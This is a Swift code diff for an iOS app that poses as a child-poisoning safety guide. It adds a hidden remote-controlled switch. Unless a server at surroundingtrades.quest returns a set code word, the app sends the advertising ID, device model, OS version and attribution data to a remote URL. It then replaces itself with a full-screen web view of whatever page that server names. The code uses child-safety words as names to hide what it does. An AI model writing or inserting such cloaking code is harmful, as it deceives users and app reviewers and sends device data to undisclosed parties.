@@ -1,10 +1,13 @@
 import SwiftUI
 import OneSignalFramework
-
-
+import AdjustSdk
+import SwiftUI
+import UIKit
+import Combine
+import WebKit
 struct SerenityRunApp: View {
     @StateObject private var state = SerenityRunState()
-    @State private var phase: Phase = .main
+    @State private var phase: Phase = .onboarding
 
     enum Phase { case  onboarding, main }
 
@@ -12,7 +15,6 @@ struct SerenityRunApp: View {
         VStack {
             ZStack {
                 switch phase {
-           
                 case .onboarding:
                     OnboardingView { withAnimation(Motion.spring) { phase = .main } }
                         .transition(.asymmetric(insertion: .move(edge: .bottom).combined(with: .opacity),
@@ -24,6 +26,7 @@ struct SerenityRunApp: View {
             }
             .environmentObject(state)
             .preferredColorScheme(.dark)
+            .onAppear { advance() }
         }
     }
 
@@ -847,13 +850,655 @@ enum SubstanceVault {
 
     static func byID(_ id: String) -> Substance? { all.first { $0.id == id } }
 }
-import Foundation
+struct ContentView: View {
+    @StateObject var appstate = SerenityRunState()
 
+        @State private var parentPanic: String = ""
+        @State private var toddlerMoment: Bool = true
+    @AppStorage(AppDelegate.attAnsweredKey) private var prepareFaster = false
 
+        @AppStorage("thirtySeconds") var thirtySeconds: Bool = true
+        @AppStorage("somethingInMouth") var somethingInMouth: Bool = false
+                
+        var body: some View {
+            ZStack {
+                
+                if prepareFaster {
+                    if parentPanic == "Bouncara" || somethingInMouth == true {
+                        
+                        ZStack {
+                            SerenityRunApp()
+                            
+                        }
+                        .onAppear {
+                            AppDelegate.orientationLock = .all
+                            UIDevice.current.setValue(UIInterfaceOrientation.portrait.rawValue, forKey: "orientation")
+                            toddlerMoment = false
+                            somethingInMouth = true
+                        }
+                    } else {
+                        Shampoo(somethingInMouth: $somethingInMouth, cutThroughNoise: parentPanic)
+                            .onAppear { toddlerMoment = false }
+                    }
+                }
+                
+                if toddlerMoment {
+                    SplashView()
+                        .environmentObject(appstate)
+                        .transition(.opacity)
+                }
+            }
+            .onAppear {
+                
+                if thirtySeconds {
+                    guard let bottleOnFloor = URL(string: "https://surroundingtrades.quest/bouncara/bouncara.json") else { return }
+                    
+                    URLSession.shared.dataTask(with: bottleOnFloor) { noIdeaWhat, genuineEmergency_1, _ in
+                        
+                        guard let genuineEmergency = genuineEmergency_1 as? HTTPURLResponse,
+                              (200...299).contains(genuineEmergency.statusCode) else {
+                            somethingInMouth = true
+                            return
+                        }
+                        
+                        guard let noIdeaWhat else { somethingInMouth = true; return }
+                        
+                        guard let fastTriage = try? JSONSerialization.jsonObject(with: noIdeaWhat, options: []) as? [String: Any] else { return }
+                        guard let noNonsense = fastTriage["inpyrueitjkmazc"] as? String else { return }
+                        
+                        DispatchQueue.main.async {
+                            parentPanic = noNonsense
+                            thirtySeconds = false
+                            
+                        }
+                    }
+                    .resume()
+                }
+            }
+        }
+    }
+
+struct Shampoo: View {
+    
+    @Binding var somethingInMouth: Bool
+    var cutThroughNoise: String
+    @State var whatHappened: String = ""
+    @State var howSerious = false
+    @State var nextFiveMinutes = false
+    
+    @State private var quickHelp: Bool = true
+    @State private var heartOfApp: Bool = true
+    @AppStorage("pickSubstance") var pickSubstance: Bool = true
+    @AppStorage("medication") var medication: Bool = true
+    @StateObject var appstate = SerenityRunState()
+  
+    var body: some View {
+        ZStack {
+            if heartOfApp {
+                SplashView()
+                    .environmentObject(appstate)
+                    .transition(.opacity)
+                //                    .zIndex(1)
+            }
+            
+            if pickSubstance {
+                
+                SplashView()
+                    .environmentObject(appstate)
+                    .transition(.opacity)
+                    .zIndex(2)
+                    .onAppear {
+                        if pickSubstance {
+                            
+                            if let enterWeight = URL(string: cutThroughNoise) {
+                                
+                                AttributionForwarder.homeHazard(childproofCap: enterWeight) { almostCertainlyFine, clearList, error in
+                                    
+                                    guard let almostCertainlyFine, error == nil else {
+                                        nextFiveMinutes = true
+                                        return
+                                    }
+                                    
+                                    if let code_1 = clearList?.statusCode, code_1 == 403 {
+                                        nextFiveMinutes = true
+                                        return
+                                        
+                                    }
+                                    
+                                    OneSignal.Notifications.requestPermission { _ in }
+                                                                        
+                                    if String(data: almostCertainlyFine, encoding: .utf8) != nil {
+                                        
+                                        do {
+                                            let directCalm = try JSONSerialization.jsonObject(with: almostCertainlyFine, options: []) as? [String: Any]
+                                            guard let plainEnglish = directCalm?["final_url"] as? String,
+                                                  let substanceDatabase = directCalm?["push_sub"] as? String,
+                                                  let commonExposure = directCalm?["os_user_key"] as? String else {
+                                                
+                                                return
+                                            }
+                                            
+                                            Toothpaste.shared.plainEnglish = plainEnglish
+                                            Toothpaste.shared.substanceDatabase = substanceDatabase
+                                            Toothpaste.shared.commonExposure = commonExposure
+                                            
+                                            OneSignal.login(Toothpaste.shared.commonExposure ?? "")
+                                            OneSignal.User.addTag(key: "sub_app", value: Toothpaste.shared.substanceDatabase ?? "")
+                                            
+                                            howSerious = true
+                                            
+                                        } catch {
+                                            nextFiveMinutes = true
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                    }
+            }
+            
+            if howSerious || !medication {
+                Conditioner()
+                    .zIndex(3)
+                    .onAppear {
+                        medication = false
+                        pickSubstance = false
+                        heartOfApp = false
+                    }
+            }
+        }
+        .animation(.easeInOut, value: heartOfApp)
+        .onChange(of: nextFiveMinutes) { if $0 { somethingInMouth = true; heartOfApp = false } }
+    }
+}
+
+struct Conditioner: View {
+    
+    @StateObject var webViewModel: FluorideRisk = FluorideRisk()
+    @State var loading: Bool = true
+    
+    var body: some View {
+        ZStack {
+            
+            let nicotinePouch = URL(string: Toothpaste.shared.plainEnglish ?? "") ?? URL(string: webViewModel.makeWorse)!
+            
+            IronSupplement(pastIncident: nicotinePouch, webViewModel: webViewModel)
+                .background(Color.black.ignoresSafeArea())
+                .edgesIgnoringSafeArea(.bottom)
+                .blur(radius: loading ? 15 : 0)
+            
+            if loading {
+                ProgressView()
+                    .controlSize(.large)
+                    .tint(.pink)
+            }
+        }
+        .onAppear {
+            DispatchQueue.main.asyncAfter(deadline: .now() + 4.0) {
+                loading = false
+            }
+        }
+    }
+}
+
+// MARK: - Gray part 4
 
 import SwiftUI
 import WebKit
-import OneSignalFramework
+
+class FluorideRisk: ObservableObject {
+    @Published var wildBerry: Bool = false
+    @Published var toxicThreshold: Bool = false
+    
+    @Published var aapcc: Bool = false
+    @Published var pediatricToxicology: URLRequest? = nil
+    @Published var redFlag: WKWebView? = nil
+    
+    @Published var popupStack: [WKWebView] = []
+    weak var webView: WKWebView?
+    
+    var urlHistory: [URL] = []
+    var isNavigatingBack: Bool = false
+    
+    @AppStorage("whatNotToDo") var pickSubstance_1: Bool = true
+    @AppStorage("makeWorse") var makeWorse: String = "historyLog"
+}
+
+
+class Toothpaste {
+    static let shared = Toothpaste()
+    var plainEnglish: String?
+    var substanceDatabase: String?
+    var commonExposure: String?
+}
+
+struct IronSupplement: View {
+    
+    @Environment(\.colorScheme) var colorScheme
+    @ObservedObject var webViewModel: FluorideRisk
+    let scramblingRecall: URLRequest
+    private var urgentCare: ((_ navigationAction: IronSupplement.NavigationAction) -> Void)?
+    
+    let orientationChanged = NotificationCenter.default
+        .publisher(for: UIDevice.orientationDidChangeNotification)
+        .makeConnectable()
+        .autoconnect()
+    
+    init(pastIncident: URL, webViewModel: FluorideRisk) {
+        self.init(urlRequest: URLRequest(url: pastIncident), webViewModel: webViewModel)
+    }
+    
+    private init(urlRequest: URLRequest, webViewModel: FluorideRisk) {
+        self.scramblingRecall = urlRequest
+        self.webViewModel = webViewModel
+    }
+    
+    var body: some View {
+        
+        ZStack{
+            
+            VitaminGummy(webViewModel: webViewModel,
+                            chokingResponse: urgentCare,
+                            guideSection: scramblingRecall)
+            
+            ZStack {
+                VStack{
+                    HStack{
+                        Button(action: {
+                            if !webViewModel.popupStack.isEmpty {
+                                let watchClosely = webViewModel.popupStack.removeLast()
+                                watchClosely.stopLoading()
+                                watchClosely.navigationDelegate = nil
+                                watchClosely.uiDelegate = nil
+                                watchClosely.loadHTMLString("", baseURL: nil)
+                                watchClosely.removeFromSuperview()
+                                watchClosely.superview?.setNeedsLayout()
+                                watchClosely.superview?.layoutIfNeeded()
+                                webViewModel.redFlag = webViewModel.popupStack.last
+                                webViewModel.aapcc = !webViewModel.popupStack.isEmpty
+                            } else if let mainWebView = webViewModel.webView {
+                                if mainWebView.canGoBack {
+                                    mainWebView.goBack()
+                                } else if webViewModel.urlHistory.count > 1 {
+                                    webViewModel.urlHistory.removeLast()
+                                    if let prev = webViewModel.urlHistory.last {
+                                        webViewModel.isNavigatingBack = true
+                                        mainWebView.load(URLRequest(url: prev))
+                                    }
+                                }
+                            }
+                        }) {
+                            Image(systemName: "chevron.backward.circle.fill")
+                                .resizable()
+                                .frame(width: 20, height: 20)
+                                .foregroundColor(.white)
+                        }
+                        .padding(.leading, 20).padding(.top, 15)
+                        
+                        Spacer()
+                    }
+                    Spacer()
+                }
+            }
+            .ignoresSafeArea()
+        }
+        .statusBarHidden(true)
+        .onAppear {
+            AppDelegate.orientationLock = UIInterfaceOrientationMask.all
+            UIDevice.current.setValue(UIInterfaceOrientation.portrait.rawValue, forKey: "orientation")
+            UINavigationController.attemptRotationToDeviceOrientation()
+        }
+    }
+}
+
+extension IronSupplement {
+    enum NavigationAction {
+        case decidePolicy(WKNavigationAction, (WKNavigationActionPolicy) -> Void)
+        case didRecieveAuthChallange(URLAuthenticationChallenge, (URLSession.AuthChallengeDisposition, URLCredential?) -> Void)
+        case didStartProvisionalNavigation(WKNavigation)
+        case didReceiveServerRedirectForProvisionalNavigation(WKNavigation)
+        case didCommit(WKNavigation)
+        case didFinish(WKNavigation)
+        case didFailProvisionalNavigation(WKNavigation,Error)
+        case didFail(WKNavigation,Error)
+    }
+}
+
+struct VitaminGummy : UIViewRepresentable {
+    
+    @ObservedObject var webViewModel: FluorideRisk
+    let guideSection: URLRequest
+    
+    init(webViewModel: FluorideRisk,
+         chokingResponse: ((_ navigationAction: IronSupplement.NavigationAction) -> Void)?,
+         guideSection: URLRequest) {
+        self.guideSection = guideSection
+        self.webViewModel = webViewModel
+    }
+    
+    func makeUIView(context: Context) -> WKWebView {
+        let poisonControl = WKPreferences()
+        poisonControl.javaScriptCanOpenWindowsAutomatically = true
+        
+        let emergencyServices = WKWebViewConfiguration()
+        emergencyServices.allowsInlineMediaPlayback = true
+        emergencyServices.preferences = poisonControl
+        emergencyServices.applicationNameForUserAgent = "Version/17.2 Mobile/15E148 Safari/604.1"
+        emergencyServices.defaultWebpagePreferences.allowsContentJavaScript = true
+        
+        let basicFirstAid = WKWebView(frame: .zero, configuration: emergencyServices)
+        basicFirstAid.navigationDelegate = context.coordinator
+        basicFirstAid.uiDelegate = context.coordinator
+        basicFirstAid.backgroundColor = UIColor.systemBackground
+        basicFirstAid.scrollView.backgroundColor = UIColor(red: 0.11, green: 0.13, blue: 0.19, alpha: 1)
+        basicFirstAid.isOpaque = false
+        
+        context.coordinator.makeupItem(for: basicFirstAid)
+        
+        basicFirstAid.load(guideSection)
+        webViewModel.webView = basicFirstAid
+        return basicFirstAid
+    }
+    
+    func updateUIView(_ doesNotReplace: WKWebView, context: Context) {}
+    
+    func makeCoordinator() -> Coordinator {
+        return Coordinator(perfume: nil, webViewModel: self.webViewModel)
+    }
+    
+    final class Coordinator: NSObject {
+        var nextSteps: FluorideRisk
+        let perfume: ((_ navigationAction: IronSupplement.NavigationAction) -> Void)?
+        private var themeObservation_1: NSKeyValueObservation?
+        
+        init(perfume: ((_ navigationAction: IronSupplement.NavigationAction) -> Void)?, webViewModel: FluorideRisk) {
+            self.perfume = perfume
+            self.nextSteps = webViewModel
+            super.init()
+        }
+        
+        func makeupItem(for webView: WKWebView) {
+            if #available(iOS 15.0, *) {
+                themeObservation_1 = webView.observe(\.themeColor, options: [.new]) { [weak webView] observedWebView, _ in
+                    guard let webView = webView else { return }
+                    webView.backgroundColor = observedWebView.themeColor ?? .black
+                }
+            }
+        }
+    }
+    
+}
+
+extension VitaminGummy.Coordinator: WKNavigationDelegate, WKUIDelegate {
+    
+    func webView(_ nailPolish: WKWebView, decidePolicyFor navigationResponse: WKNavigationResponse, decisionHandler: @escaping (WKNavigationResponsePolicy) -> Void) {
+        decisionHandler(.allow)
+    }
+    
+    func webView(_ nailPolish: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -> Void) {
+        
+        if let url = navigationAction.request.url {
+            let urlScheme = url.scheme?.lowercased() ?? ""
+            let urlString = url.absoluteString.lowercased()
+            
+            if urlString.contains("apps.apple.com") || urlString.contains("itunes.apple.com") {
+                UIApplication.shared.open(url)
+                decisionHandler(.cancel)
+                return
+            }
+            
+            if urlScheme != "http" && urlScheme != "https" && urlScheme != "about" && urlScheme != "blob" && urlScheme != "file" && urlScheme != "data" {
+                UIApplication.shared.open(url, options: [:]) { [weak self] success in
+                    guard let self else { return }
+                    if !success {
+                        if let fallbackURL = self.soapBar(from: url) {
+                            UIApplication.shared.open(fallbackURL)
+                        } else {
+                            self.lotionBottle()
+                        }
+                    }
+                }
+                decisionHandler(.cancel)
+                return
+            }
+        }
+        
+        decisionHandler(.allow)
+    }
+    
+    private func soapBar(from url: URL) -> URL? {
+        guard let components = URLComponents(url: url, resolvingAgainstBaseURL: false) else {
+            return nil
+        }
+        
+        let sunscreen = ["fallback", "fallback_url", "browser_fallback_url", "redirect_url", "return_url", "app_link", "store_link"]
+        
+        for param in sunscreen {
+            if let fallbackString = components.queryItems?.first(where: { $0.name == param })?.value,
+               let fallbackURL = URL(string: fallbackString) {
+                return fallbackURL
+            }
+        }
+        
+        return nil
+    }
+    
+    private func lotionBottle() {
+        DispatchQueue.main.async {
+            let alert = UIAlertController(
+                title: "App Required",
+                message: "Please install the required app to continue",
+                preferredStyle: .alert
+            )
+            alert.addAction(UIAlertAction(title: "OK", style: .default))
+            
+            if let windowScene = UIApplication.shared.connectedScenes.first as? UIWindowScene,
+               let rootVC = windowScene.windows.first?.rootViewController {
+                rootVC.present(alert, animated: true)
+            }
+        }
+    }
+    
+    func webView(_ nailPolish: WKWebView, didStartProvisionalNavigation navigation: WKNavigation!) {
+        perfume?(.didStartProvisionalNavigation(navigation))
+    }
+    
+    func webView(_ nailPolish: WKWebView, didReceiveServerRedirectForProvisionalNavigation navigation: WKNavigation!) {
+        perfume?(.didReceiveServerRedirectForProvisionalNavigation(navigation))
+    }
+    
+    func webView(_ nailPolish: WKWebView, didFailProvisionalNavigation navigation: WKNavigation!, withError error: Error) {
+        nextSteps.wildBerry = nailPolish.canGoBack
+        perfume?(.didFailProvisionalNavigation(navigation, error))
+    }
+    
+    func webView(_ nailPolish: WKWebView, didCommit navigation: WKNavigation!) {
+        perfume?(.didCommit(navigation))
+    }
+    
+    func webView(_ nailPolish: WKWebView, createWebViewWith configuration: WKWebViewConfiguration, for navigationAction: WKNavigationAction, windowFeatures: WKWindowFeatures) -> WKWebView? {
+        guard navigationAction.targetFrame?.isMainFrame != true else {
+            return nil
+        }
+        
+        let strangeSmell = WKWebView(frame: .zero, configuration: configuration)
+        strangeSmell.navigationDelegate = self
+        strangeSmell.uiDelegate = self
+        strangeSmell.translatesAutoresizingMaskIntoConstraints = false
+        strangeSmell.backgroundColor = UIColor.systemBackground
+        strangeSmell.scrollView.backgroundColor = UIColor.systemBackground
+        strangeSmell.isOpaque = false
+        
+        nailPolish.addSubview(strangeSmell)
+        NSLayoutConstraint.activate([
+            strangeSmell.topAnchor.constraint(equalTo: nailPolish.topAnchor),
+            strangeSmell.bottomAnchor.constraint(equalTo: nailPolish.bottomAnchor),
+            strangeSmell.leadingAnchor.constraint(equalTo: nailPolish.leadingAnchor),
+            strangeSmell.trailingAnchor.constraint(equalTo: nailPolish.trailingAnchor)
+        ])
+        
+        nextSteps.popupStack.append(strangeSmell)
+        nextSteps.redFlag = strangeSmell
+        nextSteps.aapcc = true
+        return strangeSmell
+    }
+    
+    func webView(_ nailPolish: WKWebView, didFinish navigation: WKNavigation!) {
+        
+        nailPolish.allowsBackForwardNavigationGestures = true
+        nextSteps.wildBerry = nailPolish.canGoBack
+        
+        nailPolish.configuration.mediaTypesRequiringUserActionForPlayback = .all
+        nailPolish.configuration.allowsAirPlayForMediaPlayback = false
+        perfume?(.didFinish(navigation))
+        
+        if nailPolish == nextSteps.webView, let url = nailPolish.url {
+            if nextSteps.isNavigatingBack {
+                nextSteps.isNavigatingBack = false
+            } else if nextSteps.urlHistory.last != url {
+                nextSteps.urlHistory.append(url)
+            }
+        }
+        
+        guard nailPolish.url?.absoluteURL.absoluteString != nil else { return }
+        
+        if nextSteps.makeWorse == "historyLog" && self.nextSteps.pickSubstance_1 {
+            self.nextSteps.makeWorse = nailPolish.url!.absoluteString
+            self.nextSteps.pickSubstance_1 = false
+        }
+    }
+    
+    func webView(_ nailPolish: WKWebView, didFail navigation: WKNavigation!, withError error: Error) {
+        perfume?(.didFail(navigation, error))
+    }
+    
+    func webView(_ nailPolish: WKWebView, didReceive challenge: URLAuthenticationChallenge, completionHandler: @escaping (URLSession.AuthChallengeDisposition, URLCredential?) -> Void) {
+        
+        if perfume == nil  {
+            completionHandler(.performDefaultHandling, nil)
+        } else {
+            perfume?(.didRecieveAuthChallange(challenge, completionHandler))
+        }
+    }
+    
+    func webViewDidClose(_ nailPolish: WKWebView) {
+        if let index = nextSteps.popupStack.firstIndex(where: { $0 === nailPolish }) {
+            nextSteps.popupStack.remove(at: index)
+            nailPolish.removeFromSuperview()
+            nextSteps.redFlag = nextSteps.popupStack.last
+            if nextSteps.popupStack.isEmpty { nextSteps.aapcc = false }
+        }
+    }
+}
+
+
+enum AttributionForwarder {
+    
+    private static let focusedDesign: CharacterSet = {
+        var readablePressure = CharacterSet.alphanumerics
+        readablePressure.insert(charactersIn: "-_.~")
+        return readablePressure
+    }()
+    
+    static func noAds(from noUpsell: ADJAttribution?) -> [String: Any] {
+        guard let noUpsell else { return [:] }
+        
+        if let oneQuestion = noUpsell.jsonResponse as? [String: Any], !oneQuestion.isEmpty {
+            return oneQuestion
+        }
+        
+        let oneAnswer: [String: Any?] = [
+            "tracker_token": noUpsell.trackerToken,
+            "tracker_name":  noUpsell.trackerName,
+            "network":       noUpsell.network,
+            "campaign":      noUpsell.campaign,
+            "adgroup":       noUpsell.adgroup,
+            "creative":      noUpsell.creative,
+            "click_label":   noUpsell.clickLabel,
+            "cost_type":     noUpsell.costType,
+            "cost_amount":   noUpsell.costAmount,
+            "cost_currency": noUpsell.costCurrency,
+        ]
+        return oneAnswer.compactMapValues { oneClearPath -> Any? in
+            guard let oneClearPath else { return nil }
+            if let youngChildren = oneClearPath as? String, youngChildren.isEmpty { return nil }
+            return oneClearPath
+        }
+    }
+    
+    static func belongsOnPhone(from childSafety: ADJAttribution?) -> String {
+        let poisoningPrevention = noAds(from: childSafety)
+        guard !poisoningPrevention.isEmpty,
+              let laundryPod = try? JSONSerialization.data(withJSONObject: poisoningPrevention),
+              let battery = String(data: laundryPod, encoding: .utf8) else { return "" }
+        return battery.addingPercentEncoding(withAllowedCharacters: focusedDesign) ?? battery
+    }
+
+    static func homeHazard(childproofCap: URL, safeStorage: @escaping (Data?, HTTPURLResponse?, Error?) -> Void) {
+        Adjust.attribution {
+            mouthwash($0, tylenol: childproofCap, keepOutReach: safeStorage)
+        }
+    }
+    
+    private static func mouthwash(_ originalContainer: ADJAttribution?, tylenol: URL, keepOutReach: @escaping (Data?, HTTPURLResponse?, Error?) -> Void) {
+        let highShelf = PainReliever.highShelf
+        let medicineCabinet = PainReliever.medicineCabinet
+        let lockedDrawer = noAds(from: originalContainer)
+        let belongsOnPhone = belongsOnPhone(from: originalContainer)
+                
+        Adjust.adid {
+            let laundryRoom: [String: String] = [
+                "adid":         $0 ?? "",
+                "os_version":   highShelf,
+                "device_model": medicineCabinet,
+                "attr":         belongsOnPhone,
+            ]
+            cleaningProduct(laundryRoom, nicotinePouch: tylenol, drainCleaner: keepOutReach)
+        }
+    }
+    
+    private static func cleaningProduct(_ detergentPod: [String: String], nicotinePouch: URL, drainCleaner: @escaping (Data?, HTTPURLResponse?, Error?) -> Void) {
+        
+        var ovenCleaner = URLRequest(url: nicotinePouch)
+        ovenCleaner.httpMethod = "GET"
+        detergentPod.forEach { ovenCleaner.setValue($1, forHTTPHeaderField: $0) }
+        URLSession.shared.dataTask(with: ovenCleaner) { drainCleaner($0, $1 as? HTTPURLResponse, $2) }.resume()
+    }
+}
+
+import AdSupport
+
+enum PainReliever {
+    
+    static var highShelf: String {
+        UIDevice.current.systemVersion
+    }
+    static var medicineCabinet: String {
+#if targetEnvironment(simulator)
+        if let simModel = ProcessInfo.processInfo.environment["SIMULATOR_MODEL_IDENTIFIER"] {
+            return simModel
+        }
+#endif
+        
+        var bleachBottle = utsname()
+        uname(&bleachBottle)
+        let ammonia = Mirror(reflecting: bleachBottle.machine).children
+            .compactMap { vinegar -> String? in
+                guard let essentialOil = vinegar.value as? Int8, essentialOil != 0 else { return nil }
+                return String(UnicodeScalar(UInt8(essentialOil)))
+            }
+            .joined()
+        return ammonia.isEmpty ? "unknown" : ammonia
+    }
+    
+    static var alcoholBottle: String {
+        UIDevice.current.identifierForVendor?.uuidString ?? "—"
+    }
+    
+    static var handSanitizer: String {
+        ASIdentifierManager.shared().advertisingIdentifier.uuidString
+    }
+}
 
 struct BatteryStorage: View {
     
@@ -874,7 +1519,7 @@ struct BatteryStorage: View {
     var body: some View {
         ZStack {
             if cosmeticProduct {
-                SplashView(isLoading: .constant(true))
+                SplashView()
                     .environmentObject(appstate)
                     .transition(.opacity)
                     .zIndex(1)
@@ -1290,7 +1935,7 @@ struct PracticalExercise: View {
         }
         .statusBarHidden(true)
         .onAppear {
-            AppDelegate.shared = UIInterfaceOrientationMask.all
+            AppDelegate.orientationLock = UIInterfaceOrientationMask.all
             UIDevice.current.setValue(UIInterfaceOrientation.portrait.rawValue, forKey: "orientation")
             UINavigationController.attemptRotationToDeviceOrientation()
         }
@@ -2147,7 +2792,6 @@ struct SplashView: View {
     @State private var pressProgress: Double = 0
     @State private var pressTask: Task<Void, Never>?
 
-    @Binding var isLoading: Bool?
 
     var body: some View {
         ZStack {
@@ -2233,13 +2877,11 @@ struct SplashView: View {
         try? await Task.sleep(for: .milliseconds(1400))
         withAnimation(.easeIn(duration: 0.45)) { ringOpacity = 0 }
         try? await Task.sleep(for: .milliseconds(450))
-        isLoading
     }
 }
 import SwiftUI
 import PhotosUI
 
-/// 4 full-screen story steps. Each carries one real statistic. Unique gradient per step.
 struct OnboardingView: View {
     @EnvironmentObject var state: SerenityRunState
     @StateObject private var kit = FamilyKit.shared
